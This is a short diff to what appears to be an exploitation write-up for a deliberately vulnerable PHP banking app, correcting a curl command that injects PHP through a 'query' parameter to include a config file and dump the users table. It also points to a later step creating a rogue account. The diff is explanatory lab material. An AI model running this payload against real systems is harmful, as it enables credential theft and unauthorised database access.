@@ -62,7 +62,7 @@ Standard SQLi in this app is constrained by the PHP `mysql` driver (no stacked q
 curl -b cookies.txt -G "http://localhost/index.php" \
   --data-urlencode "page=htbdetails" \
   --data-urlencode "account=252170513" \
-  --data-urlencode "query=test'.(include '../etc/config.php').(print_r(mysql_fetch_assoc(mysql_query('SELECT * FROM users')))).'"
+  --data-urlencode "query=test'.(include('../etc/config.php')).(print_r(mysql_fetch_assoc(mysql_query('SELECT * FROM users')))).'"
 ```
 
 ### 2.2 Creating a Rogue Account
